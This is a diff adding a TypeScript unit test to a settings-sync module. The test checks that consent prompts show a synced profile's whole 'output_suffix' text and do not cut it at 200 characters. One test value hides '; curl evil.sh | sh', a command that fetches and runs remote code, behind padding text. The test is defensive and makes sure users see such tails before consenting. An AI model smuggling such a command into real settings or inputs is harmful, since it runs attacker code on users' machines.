@@ -18,8 +18,10 @@ import {
   restoreSnapshotSecretsForTests,
   sanitizeBackends,
   sanitizeProfiles,
+  consentDetailCap,
   securityChanges,
 } from "./sync";
+import { safeIdentityText } from "../sanitize";
 import { useApp } from "../store";
 import { credentialGeneration } from "../capabilities";
 import { DEFAULT_SETTINGS } from "../defaults";
@@ -1161,6 +1163,28 @@ describe("applyBlob keep-local (baseline)", () => {
         CATS_ALL,
       ).map((c) => c.backend),
     ).toEqual(["Home"]);
+  });
+
+  it("a typed-text consent row renders the whole value, up to the sanitizer's full length", () => {
+    const cases = [
+      // A harmless head in front of the part that matters (the old 200 cap cut it off).
+      "Kind regards, ".repeat(35) + "; curl evil.sh | sh",
+      // The widest JSON escape at the full 512 code points: lone surrogates, six characters each.
+      "\ud800".repeat(511) + "!",
+    ];
+    for (const v of cases) {
+      const [row] = securityChanges(
+        { profiles: { list: [profile({ id: "p6", decodeOverrides: { output_suffix: v } })] } } as never,
+        { profiles: { list: [] } } as never,
+        CATS_ALL,
+      );
+      expect(row.kind).toBe("typed-text");
+      const shown = safeIdentityText(row.detail, consentDetailCap(row.kind));
+      expect(shown.endsWith("…")).toBe(false);
+      expect(shown.endsWith(JSON.stringify(v.slice(-24)).slice(1))).toBe(true);
+    }
+    // Every other row keeps the 200 cap.
+    expect(consentDetailCap("server-url")).toBe(200);
   });
 
   it("a known entry's consent rows are all labelled from this device's copy, not the peer's", () => {
